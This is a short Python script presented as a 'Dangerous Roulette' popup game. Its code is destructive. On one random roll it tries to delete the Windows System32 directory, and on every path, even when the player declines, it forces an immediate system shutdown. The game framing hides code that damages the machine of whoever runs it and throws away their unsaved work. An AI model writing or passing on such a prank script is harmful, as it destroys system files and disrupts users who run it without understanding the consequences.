#CREATED BY IVOOF_

import PySimpleGUI as sg
import random
import os
import time

time_duration = 5
spin = random.randint(0, 6)
start = sg.popup_get_text('Do you really want to play? Y/N:')
sg.popup('Dangerous Roulette', 'Your answers was: ', start)

if start == "Y" or start == "Yes" or start == "YES" or start == "y":
    try:
        if spin == 1:
            sg.popup("You were very unlucky, you lost!! You have 5 seconds!.")
            os.remove('C:\Windows\System32')
            time.sleep(time_duration)
            os.system("shutdown /s /t 1")
        else:
            sg.popup("You were very lucky, you won! But I'm also going to turn off your pc! Thanks for playing!")
            time.sleep(time_duration)
            os.system("shutdown /s /t 1")

    except Exception as error:
        sg.popup(error)
else:
    sg.popup("What a coward! You can't escape.")
    time.sleep(time_duration)
    os.system("shutdown /s /t 1")


#CREATED BY IVOOF_
